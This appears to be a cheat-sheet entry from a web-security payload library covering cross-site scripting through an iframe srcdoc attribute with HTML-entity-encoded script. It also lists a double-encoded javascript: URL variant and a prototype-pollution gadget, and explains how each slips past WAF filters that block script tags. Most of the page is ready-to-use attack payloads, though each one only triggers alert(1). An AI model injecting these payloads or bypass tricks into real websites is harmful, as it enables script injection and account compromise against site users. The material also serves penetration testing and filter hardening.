---
title: iframe srcdoc with HTML-Encoded Script
slug: iframe-srcdoc-encoded
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/innerHTML, sink/waf-bypass]
inbound: []
---

# iframe srcdoc with HTML-Encoded Script

## Payload

```html
<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>
```

## Variants

```html
<!-- iframe JS URL with double encoding -->
<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>

<!-- Google reCAPTCHA PP gadget (srcdoc via prototype pollution) -->
Object.prototype.srcdoc=['<script>alert(1)<\/script>']
```

## Context

`srcdoc` is a `<iframe>` attribute whose value is parsed as HTML for the iframe's content document. Named HTML entities (`&lt;`, `&gt;`, `&lpar;`, `&rpar;`, `&sol;`) in the `srcdoc` value are decoded by the outer HTML parser before the iframe document is created, allowing a `<script>` tag to be delivered without angle brackets appearing literally in the injection. The double-encoded `javascript:` variant uses the iframe `src` with `%3C%2F` URL-encoding decoded inside the string context. Effective when WAF blocks `<script` but allows `<iframe`. Requires `innerHTML`/`outerHTML`/`document.write`.

## Provenance

- Distilled from: `../../techniques/dom-xss/waf-bypass.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [WAF Bypass and Obfuscation](../../techniques/dom-xss/waf-bypass.md)
- [Prototype Pollution to XSS](../../techniques/dom-xss/prototype-pollution-xss.md)
